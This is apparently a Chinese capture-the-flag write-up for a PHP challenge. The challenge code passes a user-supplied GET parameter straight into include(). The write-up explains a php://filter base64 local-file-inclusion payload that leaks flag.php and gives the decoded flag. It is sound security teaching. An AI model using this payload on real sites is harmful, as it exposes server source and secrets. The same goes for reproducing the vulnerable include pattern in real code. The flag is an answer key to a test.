题目：
```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}

```

解答：
看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。
file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。
而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。
payload：
`?file=php://filter/convert.base64-encode/resource=flag.php`

使用BASE64解码，得到flag：
`ctfshow{6a4def4e-e8d3-49db-8f5a-c0e3512409fc}`

![[Pasted image 20240702152532.png]]